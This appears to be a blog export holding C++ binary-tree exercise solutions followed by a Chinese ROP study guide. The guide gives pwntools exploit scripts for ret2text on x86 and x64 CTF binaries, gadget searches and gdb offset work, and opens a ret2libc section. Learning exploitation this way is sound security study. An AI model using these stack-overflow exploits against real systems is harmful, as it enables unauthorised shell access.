i &lt; arr.size()) &#123; ParentTreeNode7* current = q.front(); q.pop(); //stoi是C++中的一个函数，用于将字符串转换为整数。它的完整名称是std::stoi，属于&lt;string&gt;头文件中的函数。 // 构建左子树节点 if (arr[i] != &quot;null&quot;) &#123; current-&gt;left = new ParentTreeNode7(stoi(arr[i]), ans); current-&gt;left-&gt;parent = current; q.push(current-&gt;left); ans++; &#125; //else ans++; i++; // 构建右子树节点 if (i &lt; arr.size() &amp;&amp; arr[i] != &quot;null&quot;) &#123; current-&gt;right = new ParentTreeNode7(stoi(arr[i]), ans); current-&gt;right-&gt;parent = current; q.push(current-&gt;right); ans++; &#125; //else ans++; i++; &#125; return root;&#125;//层序遍历到p然后指针停在那里ParentTreeNode7* Findpq7(ParentTreeNode7* root, int p) &#123; if (root == nullptr) &#123; return root; &#125; queue&lt;ParentTreeNode7*&gt; q; q.push(root); ParentTreeNode7* current = q.front(); while (!q.empty()) &#123; ParentTreeNode7* current = q.front(); q.pop(); if (current-&gt;ans == p) return current; if (current-&gt;left) &#123; q.push(current-&gt;left); &#125; if (current-&gt;right) &#123; q.push(current-&gt;right); &#125; &#125; return current;&#125;void FindSameParent7(ParentTreeNode7* root,int p,int q)&#123; //层序遍历到p然后指针停在那里 ParentTreeNode7* a = Findpq7(root, p); // cout &lt;&lt; &quot;a查找成功:ans为&quot; &lt;&lt;a-&gt;ans&lt;&lt; &quot;val为&quot; &lt;&lt; a-&gt;val&lt;&lt; endl; ParentTreeNode7* b = Findpq7(root, q); // cout &lt;&lt; &quot;b查找成功:ans为&quot; &lt;&lt; b-&gt;ans&lt;&lt; &quot;val为&quot; &lt;&lt; b-&gt;val&lt;&lt;endl; while (1) &#123; // cout &lt;&lt; &quot;********遍历查找*********&quot;&lt;&lt; endl; if (a-&gt;parent == b-&gt;parent) &#123;//当前就已经相同 cout &lt;&lt; a-&gt;parent-&gt;val &lt;&lt; endl; break; &#125; else if (a == b-&gt;parent) &#123; cout &lt;&lt; a-&gt;val &lt;&lt; endl; break; &#125; else if (a-&gt;parent == b) &#123; cout &lt;&lt; b-&gt;val &lt;&lt; endl; break; &#125; //else if (a-&gt;parent == root || b-&gt;parent == root) &#123;//遍历到底 // cout &lt;&lt; &quot;输出了root值&quot; &lt;&lt; endl; // cout &lt;&lt; root-&gt;val &lt;&lt; endl; // break; // &#125; else if (a-&gt;parent-&gt;ans &lt; b-&gt;parent-&gt;ans) &#123; // cout &lt;&lt; &quot;b+1此时a的ans比b小,a为&quot; &lt;&lt; a-&gt;parent-&gt;ans &lt;&lt; &quot;,b为&quot; &lt;&lt; b-&gt;parent-&gt;ans &lt;&lt; endl; b = b-&gt;parent; &#125; else if (a-&gt;parent-&gt;ans &gt; b-&gt;parent-&gt;ans) &#123; // cout &lt;&lt; &quot;a+1此时b的ans比a小,a为&quot; &lt;&lt; a-&gt;parent-&gt;ans &lt;&lt; &quot;,b为&quot; &lt;&lt; b-&gt;parent-&gt;ans &lt;&lt; endl; a = a-&gt;parent; &#125; else continue; &#125;&#125;int main_7() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; int p = 0, q = 0; cin &gt;&gt; p &gt;&gt; q; //构建父母树 ParentTreeNode7* root = ParentTree7(arr1); // cout &lt;&lt; &quot;构建成功&quot; &lt;&lt; endl; FindSameParent7(root, p, q); return 0;&#125;/*第八题，给了二叉搜索树* 8: 恢复二叉搜索树题目描述给你二叉搜索树的根节点 root ，该树中的 恰好 两个节点的值被错误地交换。请在不改变其结构的情况下，恢复这棵树 。输入描述给一个二叉树输出描述恢复这棵树输入输出样例输入root = [1,3,null,null,2]输出[3,1,null,null,2]输入Root = [3,1,4,null,null,2]输出[2,1,4,null,null,3]**********提醒：* 二叉搜索树满足任意节点的左子树们恒定小于它，右边大于它* 此处只有两个节点值，因此我们最笨的想法就是固定一个节点往下遍历它的有没有不符合的，直到结束* 优化算法，，，，，待会看题解*///可考虑输出中序遍历，然后存成数组，数组里面的只有两个数字有问题，交换即可//构造已知二叉搜索树，可以调用树生成那个函数，他给的就是层序遍历TreeNode1 *FindWrongNode8(TreeNode1* root) &#123;//返回那个跟它错误的节点 queue&lt;TreeNode1*&gt; left;//左边 if (root-&gt;left) &#123; if (root-&gt;left-&gt;val &gt; root-&gt;val) &#123; return root-&gt;left; &#125; left.push(root-&gt;left); while (!left.empty()) &#123; TreeNode1* current = left.front(); left.pop(); //保证每个存进队列 if (current-&gt;left) &#123; left.push(current-&gt;left); &#125; if (current-&gt;right) &#123; left.push(current-&gt;right); &#125; if (current-&gt;val &gt; root-&gt;val) &#123; return current; &#125; &#125; &#125; queue&lt;TreeNode1*&gt; right; if (root-&gt;right ) &#123; if (root-&gt;right-&gt;val &lt; root-&gt;val) &#123; return root-&gt;right; &#125; right.push(root-&gt;right); while (!right.empty()) &#123; TreeNode1* current = right.front(); right.pop(); //保证每个存进队列 if (current-&gt;left) &#123; right.push(current-&gt;left); &#125; if (current-&gt;right) &#123; right.push(current-&gt;right); &#125; if (current-&gt;val &lt; root-&gt;val) &#123; return current; &#125; &#125; &#125; &#125;TreeNode1* RepirWrongTree8(TreeNode1* root) &#123; //1.固定一个，看左右子树有无问题 //2.可以爆破，层序遍历每一个， //因为只有两个不同，将每个节点看成root找子树，找到就交换val，break //3.返回root根节点 queue&lt;TreeNode1*&gt; q; q.push(root); while (!q.empty()) &#123; TreeNode1* current = q.front(); q.pop(); //保证每个存进队列 if (current-&gt;left) &#123; q.push(current-&gt;left); &#125; if (current-&gt;right) &#123; q.push(current-&gt;right); &#125; //查找当前的Node下是否有错误 //有则交换val并退出 //无则继续往下检索 TreeNode1* Wrong = FindWrongNode8(current); if (Wrong != current) &#123;//如果不等交换退出循环 int temp = Wrong-&gt;val; Wrong-&gt;val = current-&gt;val; current-&gt;val = temp; break; &#125; &#125; return root;&#125;int main_8() &#123; string arrayString1; int num = 0; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); num++; &#125; //num辅助待会输出 int height = calculateHeight3(num); int num1 = calculateNodeCount3(height - 1); TreeNode1* root = arrayToTree1(arr1);//构建树 root = RepirWrongTree8(root);//修复树 levelOrderTraversal3(root,num1);//输出现在的树 return 0;&#125;/************************第9题************************** * 9: 奇偶数题目描述如果一棵二叉树满足下述几个条件，则可以称为 奇偶树 ：二叉树根节点所在层下标为 0 ，根的子节点所在层下标为 1 ，根的孙节点所在层下标为 2 ，依此类推。偶数下标 层上的所有节点的值都是 奇 整数，从左到右按顺序 严格递增奇数下标 层上的所有节点的值都是 偶 整数，从左到右按顺序 严格递减给你二叉树的根节点，如果二叉树为 奇偶树 ，则返回 true ，否则返回 false 。输入描述给一个二叉树输出描述判断是否是奇偶树输入输出样例输入root = [1,10,4,3,null,7,9,12,8,6,null,null,2]输出true输入root = [2,1,3]输出false*///题目要求//1.偶数层为奇整数、递增//2.奇数层为偶整数、递减//考虑，，设置计层器，利用队列，对每层单独判断bool isEvenOddTree9(TreeNode1* root) &#123; queue&lt;TreeNode1*&gt; queue; int level = 0; queue.push(root); while (!queue.empty()) &#123; int size = queue.size(); int preVal = level % 2 == 0 ? 0 : 1000001; for (int i = 0; i &lt; size; i++) &#123;//每一次处理一层，把一层的全部pop出去后开始下一层 TreeNode1* node = queue.front(); queue.pop(); int val = node-&gt;val; if (level % 2 == val % 2) &#123; return false; &#125; if ((level % 2 == 0 &amp;&amp; val &lt;= preVal) || (level % 2 == 1 &amp;&amp; val &gt;= preVal)) &#123; return false; &#125; if (node-&gt;left != nullptr) &#123; queue.push(node-&gt;left); &#125; if (node-&gt;right != nullptr) &#123; queue.push(node-&gt;right); &#125; preVal = val; &#125; level++; &#125; return true;&#125;int main_9() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; //构建奇偶树 TreeNode1* root = arrayToTree1(arr1); //判断是否为奇偶树 if (isEvenOddTree9(root)) &#123; cout &lt;&lt; &quot;true&quot; &lt;&lt; endl; &#125; else cout &lt;&lt; &quot;false&quot; &lt;&lt; endl; return 0;&#125;/*10 10.二叉树的子树大小描述现在给出一棵二叉树，希望你输出它的每一个结点为根的子树大小输入第一行一个正整数 n，表示给定的树的节点的数目，规定节点编号 1∼n，其中节点 1是树根。接下来 n 行，每行两个正整数 li, ri ​ ，分别表示节点 i 的左右孩子的编号。如果不存在左 / 右孩子，则以 −1 表示。两个数之间用一个空格隔开。输出一行，n个数，分别表示i号结点为根的子树的子树大小样例输入32 3-1 -1-1 -1输出3 1 1*///思考了一下之后可以直接用顺序存储//不用链表，定义数据结构，然后用数组struct TreeNode10&#123; int left; int right;&#125;;vector&lt;int&gt; subtreeSizes;int getSubtreeSize10(int root, const vector&lt;TreeNode10&gt;&amp; tree) &#123; if (root == -1) &#123; return 0; &#125; int leftSize = getSubtreeSize10(tree[root].left, tree); int rightSize = getSubtreeSize10(tree[root].right, tree); int currentSize = leftSize + rightSize + 1; subtreeSizes[root] = currentSize; return currentSize;&#125;int main_10() &#123; int n; cin &gt;&gt; n; vector&lt;TreeNode10&gt; tree(n + 1); // 为了与题目中的节点编号从1开始保持一致，使用大小为n+1的vector // 读取树的信息 for (int i = 1; i &lt;= n; i++) &#123; cin &gt;&gt; tree[i].left &gt;&gt; tree[i].right; &#125; subtreeSizes.resize(n + 1); // 初始化存储子树大小的数组 // 计算每个结点为根的子树大小 getSubtreeSize10(1, tree); // 输出结果 for (int i = 1; i &lt;= n; i++) &#123; cout &lt;&lt; subtreeSizes[i] &lt;&lt; &quot; &quot;; &#125; return 0;&#125;/*11题，11题很好，和10题很像，相当于多了一个节点自身代值11: 二叉树的子树和描述现在给出一棵二叉树，每个结点有一个权值，希望你依次输出每一个节点为根的子树的子树权值和输入第一行一个正整数 n，表示给定的树的节点的数目，规定节点编号 1∼n，其中节点 1是树根。第二行 n 个正整数，用一个空格分隔，第 i 个正整数vi，代表节点 i 的权值。接下来 n 行，每行两个正整数 li, ri ​ ，分别表示节点 i 的左右孩子的编号。如果不存在左 / 右孩子，则以 −1 表示。两个数之间用一个空格隔开。输出一行，n个数，分别表示i号结点为根的子树的子树权值和样例输入31 1000 10002 3-1 -1-1 -1输出2001 1000 1000*///加了power的长数组struct TreeNode11 &#123; int left; int right; int power;&#125;;vector&lt;int&gt; subtreePowers;int getSubtreePower11(int root, const vector&lt;TreeNode11&gt;&amp; tree) &#123; if (root == -1) &#123; return 0; &#125; int leftPower = getSubtreePower11(tree[root].left,tree); int rightPower = getSubtreePower11(tree[root].right, tree); int currentPower = leftPower + rightPower + tree[root].power; subtreePowers[root] = currentPower; return currentPower;&#125;int main_11() &#123; int n; cin &gt;&gt; n; vector&lt;TreeNode11&gt; tree(n + 1); // 为了与题目中的节点编号从1开始保持一致，使用大小为n+1的vector for (int i = 1; i &lt;= n; i++) &#123; cin &gt;&gt; tree[i].power; &#125; // 读取树的信息 for (int i = 1; i &lt;= n; i++) &#123; cin &gt;&gt; tree[i].left &gt;&gt; tree[i].right; &#125; subtreePowers.resize(n + 1); // 初始化存储子树大小的数组 // 计算每个结点为根的子树大小 getSubtreePower11(1, tree); // 输出结果 for (int i = 1; i &lt;= n; i++) &#123; cout &lt;&lt; subtreePowers[i] &lt;&lt; &quot; &quot;; &#125; return 0;&#125;/*12: 确定树的形态描述现在给出一棵二叉树的前序遍历和后序遍历，输出树的后序遍历输入第一行一个正整数 n，表示给定的树的节点的数目，规定节点编号 1∼n，其中节点 1是树根。第二行 n 个正整数，用一个空格分隔，代表二叉树的前序遍历第三行 n 个正整数，用一个空格分隔，代表二叉树的中序遍历输出一行，n个数，用一个空格分隔，表示二叉树的后序遍历样例输入31 2 32 1 3输出2 3 1*///没想到，后面几个考遍历方法/*已知该二叉树的先序遍历序列为：A-B-D-E-G-C-F，中序遍历序列为：D-B-G-E-A-C-F。第一步：找根 先序遍历先遍历根结点 那么它的序列第一个肯定是根节点也就是上面的A第二步：找根结点的左右子数 中序遍历先左后根后右 在中序序列中找到根结点的位置那么它的左边就是它的左子树序列 右边就是它的右子数序列即上面的 D-B-G-E 和 C-F第三步：拆分转化为子问题 去掉A结点 将树分为两个二叉树 B-D-E-G 和C-F然后按照第一步分别找两颗树的根 B C 然后根据第二部找根的左右子数B(左边D 右边 G-E) C (左边NULL 右边 F) 一次类推 直到还原出二叉树的模型*/struct Node&#123; int data; Node* left; Node* right;&#125;;Node* getBinaryTree(int* preOrder, int* inOrder, int len)&#123; if (preOrder == nullptr || len &lt;= 0) return nullptr; Node* root = new Node; root-&gt;data = *preOrder; // 前序遍历的第一个节点就是根节点 // 找到根节点在中序遍历中的位置，其值也代表了左子树的节点数目 int pos = 0; while (inOrder[pos] != root-&gt;data) &#123; pos++; &#125; // 递归找到左子树和右子树 if (0 == pos) &#123; root-&gt;left = nullptr; &#125; else &#123; root-&gt;left = getBinaryTree(preOrder + 1, inOrder, pos); &#125; if (0 == len - pos - 1) &#123; root-&gt;right = nullptr; &#125; else &#123; root-&gt;right = getBinaryTree(preOrder + pos + 1, inOrder + pos + 1, len - pos - 1); &#125; return root;&#125;void postOrder(Node* root)&#123; if (root == nullptr) return; postOrder(root-&gt;left); postOrder(root-&gt;right); cout &lt;&lt; root-&gt;data&lt;&lt;&quot; &quot;;&#125;int main_12()&#123; int len; cin &gt;&gt; len; int* preOrder = new int[len];//preOder指向数组起始0处 int* inOrder = new int[len]; for (int i = 0; i &lt; len; ++i) &#123; cin &gt;&gt; preOrder[i]; &#125; for (int i = 0; i &lt; len; ++i) &#123; cin &gt;&gt; inOrder[i]; &#125; Node* root = getBinaryTree(preOrder, inOrder, len); postOrder(root); delete[] preOrder; delete[] inOrder; return 0;&#125;/*13.构建哈夫曼树哈夫曼叔的带权路径长描述现在给出一棵二叉树，每个结点有一个权值，希望你构造赫夫曼树，并输出其对应的带权路径长度输入第一行一个正整数 n，表示给定的树的节点的数目，规定节点编号 1∼n。第二行 n 个正整数，用一个空格分隔，第 i 个正整数vi，代表节点 i 的权值。输出一个数，表示对应赫夫曼树的带权路径长度样例输入31 1000 1000输出3002*///构建哈夫曼树的基本思想/*1.权值最小的在越后端 基本要求2.每次找到最小的两个权值，合成左右子树 函数1，Select两个最小节点不断合并3.root的权值=左加右，然后更新节点即可 函数2，构建哈夫曼树，不断调用函数1，最后只剩根节点4.计算带权路径长度总和 函数3：计算全部*///哈夫曼树的标准定义typedef struct&#123; int weight; // 结点的权值，为了方便直接用int int parent, lchild, rchild; // 左右孩子和双亲&#125; HTNode, * HuffmanTree;// 选择权值最小的两个结点void Select(HuffmanTree HT, int n, int&amp; index1, int&amp; index2) &#123; if (n &lt;= 1) return; index1 = index2 = 0; for (int k = 1; k &lt;= n; k++) &#123; //给index1赋初值 if (HT[k].parent == 0) &#123; index1 = k; break; &#125; &#125; for (int k = 1; k &lt;= n; k++) &#123; //给index2赋初值 if (HT[k].parent == 0 &amp;&amp; k != index1) &#123; index2 = k; break; &#125; &#125; for (int k = 1; k &lt;= n; k++) &#123; //找到最小的权值,赋给index1 if (HT[k].parent == 0 &amp;&amp; k != index2) &#123; if (HT[index1].weight &gt; HT[k].weight) &#123; index1 = k; &#125; &#125; &#125; HT[index1].parent = -1; //将最小的权值结点双亲改为-1，防止被index2选取 for (int i = 1; i &lt;= n; i++) &#123; //找到第二小的权值,赋给index2 if (HT[i].parent == 0 &amp;&amp; i != index1) &#123; if (HT[index2].weight &gt; HT[i].weight) &#123; index2 = i; &#125; &#125; &#125;&#125;// 构建哈夫曼树// HT为树,n为叶子结点数,w[]叶子的权值void CreateHuffmanTree(HuffmanTree&amp; HT, int n, int w[]) &#123; if (n &lt;= 1) // 如果结点小于等于1,直接退出 return; int m = 2 * n - 1; //总共有2*n-1个结点 HT = new HTNode[m + 1]; //为了方便,不用0号单元，HT[m]表示根结点,下表从1开始 /*给所有结点的左,右孩子以及双亲初始化为0;*/ for (int i = 1; i &lt;= m; ++i) &#123; HT[i].lchild = 0; HT[i].rchild = 0; HT[i].parent = 0; &#125; /*给前 n 个结点设置权重*/ for (int i = 1; i &lt;= n; i++) &#123; HT[i].weight = w[i]; &#125; /*给第 n 个结点之后的结点赋值,以及设置左右孩子和双亲*/ for (int i = n + 1; i &lt;= m; ++i) &#123; int s1 = -1, s2 = -1; // s1 和 s2 分别为权值最小和次小的结点下标 /* 调用Select函数 在前 i-1 个没有双亲的结点中返回权重最小的结点序号s1,s2 */ Select(HT, i - 1, s1, s2); /* 将第 s1,s2 号结点的双亲设置为第 i 个结点 同时意味着下次调用Select函数将忽略s1,s2 */ HT[s1].parent = i; HT[s2].parent = i; /*s1,s2分别作为i的左右孩子*/ HT[i].lchild = s1; HT[i].rchild = s2; /*i 的权值为左右孩子权值之和*/ HT[i].weight = HT[s1].weight + HT[s2].weight; &#125;&#125;// 计算哈夫曼树的带权路径长度int CalculateWPL(const HuffmanTree&amp; HT, int n) &#123; int wpl = 0; for (int i = 1; i &lt;= n; ++i) &#123; int depth = 0; int j = i; while (HT[j].parent != 0) &#123; j = HT[j].parent; depth++; &#125; wpl += HT[i].weight * depth; &#125; return wpl;&#125;int main() &#123; int n; cin &gt;&gt; n; int* weights = new int[n + 1]; // 为了方便，不使用0号单元 for (int i = 1; i &lt;= n; ++i) &#123; cin &gt;&gt; weights[i]; &#125; HuffmanTree ht; CreateHuffmanTree(ht, n, weights); int wpl = CalculateWPL(ht, n); cout &lt;&lt; wpl &lt;&lt; endl; delete[] ht; // 释放动态分配的内存 delete[] weights; // 释放动态分配的内存 return 0;&#125;","path":"computer-science/Data-Structures/cpp/二叉树题解/","date":"11-10","excerpt":"","tags":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}]},{"title":"Pwn复习-初级ROP","text":"# 一.ROP 编程介绍 ​ 随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP (Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。 ​ 之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件： 1. 程序存在溢出，并且可以控制返回地址。 2. 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。 3. 如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。 # 二.ret2text # 1. 原理 ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。 这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。 注： ret2text 即控制返回地址指向程序本身已有的的代码 (.text) 并执行 # 2.x64 和 x86 函数调用方式不同导致 ret2text 布栈不同 # 2.1 函数调用约定 _cdecl: c/c++ 默认方式，参数从右向左入栈，主调函数负责栈平衡。 _stdcall: Windows API 方式，参数从右向左入栈，被调函数负责栈平衡。 _fastcall: 快速调用方式。即将参数优先从寄存器传入（ecx 和 edx），剩下的参数从右向左入栈。由于栈位于内存区域，而寄存器位于 cpu 内，存取快于内存。 这里讲述默认的 gcc 调用约定_cdecl 的一些特点。 x86 使用栈传递参数 使用 eax 存放返回值 x64 前六个参数依次存放于 rdi，rsi，rdx，rcx，r8，r9 中 多余的参数存放于栈中 # 3. 解法举例 # 3.1x86 题解方法 对于函数传参的函数，其栈格式为： 故而我们需要利用溢出覆盖返回地址进入 func 函数内部，再将参数一指向 “/bin/sh” 的储存地址即可。其中要注意的是 r 处需要我们进行垃圾数据的填充。 现在利用 gdb 查找 func 函数地址和 sh 存放地址（具体偏移量由 ida 查看不再详细讲解） 注意这种 x86 是要进入 func 函数，然后把参数一覆盖成 bin/sh, 因此有三个参数，payload = padding*b'a' + p32 (ret_addr) + p32 (0) + p32 (sh_addr) 书写 payload： 行高亮12345678910111213141516171819202122232425`from pwn import * context(log_level=&#x27;debug&#x27;,arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;) file = &#x27;./ret2text_func2_x86&#x27; io = process(file)elf = ELF(file)rop = ROP(file) sh_addr = 0x804c018ret_addr = elf.symbols[&#x27;func&#x27;]padding = 0x14 payload = padding*b&#x27;a&#x27; + p32(ret_addr) + p32(0) + p32(sh_addr) dem = b&#x27;inputs:&#x27;io.sendlineafter(dem,payload)io.interactive()` 成功 # 3.2x64 解题方法 对 x64 的参数，大部分情况下，前六个参数储存在寄存器内，无法直接使用简单的栈溢出修改寄存器内容，这时候我们需要解除 ROPgadget 工具进行辅助。 ROP (Return Oriented Programming)，即返回导向编程，通过栈溢出内容覆盖返回地址，使其跳转到可执行文件中已有的片段代码中执行我们选择的代码段。 知道了 ROP 工具的功能，我们需要做的是 修改 rdi 的值（可使用代码 pop rdi ; ret） 在栈中放入‘bin/sh’经由 pop 提交给 rdi 进入 func 函数内调用 system 函数 利用 gdb 查找 func 函数地址和 sh 存放地址（具体偏移量由 ida 查看不再详细讲解）： 利用 ROPgadget 查找需要的代码行 --pop rdi ; ret 行高亮1ROPgadget --binary ret2text_func2_x64 --only &#x27;pop|ret&#x27; payload = padding*b'a' + p64 (pop_rdi_ret) + p64 (sh_addr)+ p64 (ret_addr) #64 位三步走原则 构造 payload： 行高亮1234567891011121314151617181920212223242526`from pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)#context(arch=&#x27;arm64&#x27;,os=&#x27;linux&#x27;)#打开路径file = &#x27;./ret2text_func2_x64&#x27; io = process(file) elf = ELF(file) rop = ROP(file) #调试gdb.attach(io)pause()sh_addr = 0x404028 ret_addr = elf.symbols[&#x27;func&#x27;] #这个可以自己找，也可以调用函数帮你找 pop_rdi_ret = 0x40121b #这个用gadget就行 padding = 0x10payload = padding*b&#x27;a&#x27; + p64(pop_rdi_ret) + p64(sh_addr)+ p64(ret_addr) #64位三步走原则 dem = b&#x27;inputs:&#x27; io.sendlineafter(dem,payload) io.interactive()` 运行成功 pwn 掉 # 3.3x86 举例 其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。 首先，查看一下程序的保护机制 行高亮123456➜ ret2text checksec ret2text Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。 行高亮1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;There is something amazing here, do you know anything?&quot;); gets((char *)&amp;v4); printf(&quot;Maybe I will tell you next time !&quot;); return 0;&#125; 可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现 行高亮1234567891011121314151617181920212223.text:080485FD secure proc near.text:080485FD.text:080485FD input = dword ptr -10h.text:080485FD secretcode = dword ptr -0Ch.text:080485FD.text:080485FD push ebp.text:080485FE mov ebp, esp.text:08048600 sub esp, 28h.text:08048603 mov dword ptr [esp], 0 ; timer.text:0804860A call _time.text:0804860F mov [esp], eax ; seed.text:08048612 call _srand.text:08048617 call _rand.text:0804861C mov [ebp+secretcode], eax.text:0804861F lea eax, [ebp+input].text:08048622 mov [esp+4], eax.text:08048626 mov dword ptr [esp], offset unk_8048760.text:0804862D call ___isoc99_scanf.text:08048632 mov eax, [ebp+input].text:08048635 cmp eax, [ebp+secretcode].text:08048638 jnz short locret_8048646.text:0804863A mov dword ptr [esp], offset command ; &quot;/bin/sh&quot;.text:08048641 call _system 在 secure 函数又发现了存在调用 system (&quot;/bin/sh&quot;) 的代码，那么如果我们直接控制程序返回至 0x0804863A，那么就可以得到系统的 shell 了。 下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。 行高亮123.text:080486A7 lea eax, [esp+1Ch].text:080486AB mov [esp], eax ; s.text:080486AE call _gets 可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下 行高亮1234567gef➤ b *0x080486AEBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.gef➤ rThere is something amazing here, do you know anything?Breakpoint 1, 0x080486ae in main () at ret2text.c:2424 gets(buf); ──────────────────────────────────────────────────────────────── 行高亮12345678910──────[ registers ]────$eax : 0xffffcd5c → 0x08048329 → &quot;__libc_start_main&quot;$ebx : 0x00000000$ecx : 0xffffffff$edx : 0xf7faf870 → 0x00000000$esp : 0xffffcd40 → 0xffffcd5c → 0x08048329 → &quot;__libc_start_main&quot;$ebp : 0xffffcdc8 → 0x00000000$esi : 0xf7fae000 → 0x001b1db0$edi : 0xf7fae000 → 0x001b1db0$eip : 0x080486ae → &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt; 可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 esp+0x1c，因此，我们可以推断 s 的地址为 0xffffcd5c s 相对于 ebp 的偏移为 0x6c s 相对于返回地址的偏移为 0x6c+4 最后的 payload 如下： 这种 x86 直接就是主函数中有输入函数，具体题目中二者区别不大，有时都能打通 行高亮1234567##!/usr/bin/env pythonfrom pwn import *sh = process(&#x27;./ret2text&#x27;)target = 0x804863ash.sendline(&#x27;A&#x27; * (0x6c+4) + p32(target))sh.interactive() # 3.3x86 题解补充疑问（为什么加 p32 (0)）- 栈对齐 对于本题的函数传参，我们的栈帧构造初步想法如图 ebp ‘aaaa’ r return to func 参数一 “/bin/sh” 输入适量垃圾填充 padding * b 'a' 覆盖返回地址指向 func 函数 p32 (ret_addr) 参数 &quot;/bin/sh&quot; 地址 则 payload = padding*b'a' + p32 (ret_addr) + p32 (sh_addr) 然而这样的脚本在攻击时会出错。原因在于： 正常的函数调用 call 来达到 push eip；jmp 的作用，经过初步 payload 构造的攻击如下图所示，是通过覆盖 return 达到 jmp 的作用的，并没有像 call 一样 push eip 到栈中。 故而 ret 执行后，ebp 后为我们输入的参数而非 eip 原地址（函数结束后返回的地址），而函数读取参数的位置在上文中已经展示，为 ebp+0x8。故而在利用 ret2text 覆盖 pwn 题时候，需要自行加入一行栈帧的填充。 # 三.ret2libc # I. 灵魂五问 1. 没有写 system 就一定没有 system？ 答：有 system， 在 libc 里面，别人写好的 2. 怎找到 libc 基地址 ？ 答：使用输出 libc 其中的函数地址，从而计算基地址 3. 怎么输出 libc 其中的函数地址？ 答：模仿程序如何找 libc 其中的函数地址的方式去寻找。 4. 怎把 GOT 表项内容打印出来。 答：利用输出函数泄露 got 表内容。 5. 怎么找到 system binsh 地址 答：利用偏移计算 常用会用到的指令： 行高亮123`readelf -a b|less # ROPgadget --binary 文件名 --only &quot;pop|ret&quot; #找特定gadget#寄存器ldd 文件名 #看动态链接 # II. 自己的理解 1. 我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点 ​ system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集 ​ 所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。 2. 那么如何得到 libc 中的某个函数的地址呢？ ​ 我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。 我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme https://github.com/lieanu/LibcSearcher 此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。 这里我们泄露 libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下 1. 泄露 libc_start_main 地址 2. 获取 libc 版本 3. 获取 system 地址与 /bin/sh 的地址 4. 再次执行源程序 5. 触发栈溢出执行 system (‘/bin/sh’)** # III. 解法举例 # 1)x64: # 0. 调用约定 64 位系统中使用寄存器传递参数：rdi、rsi、rdx、rcx、r8、r9（1-6 个参数） 参考：http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/ 要构造 write (1,buf2,20)，需要控制 3 个参数：rdi、rsi、rdx， 第 3 个参数代表输出的 size，如果没有 rdx 的 gadget 可以暂时不管，输出多少无所谓， 在下面我们构造 payload 的时候，我们不写第 3 个参数 # 0.1 举例 行高亮1234567891011当我们覆盖到rbp后回忆函数调用的流程，把rbp的下一个地址开始原来存的东西覆盖成我们想要的地址第一次： 第二次回到main----rbp(esp0-16)(ida-&gt;s)：覆盖完 ----同理----esp0-8(ida-&gt;r): 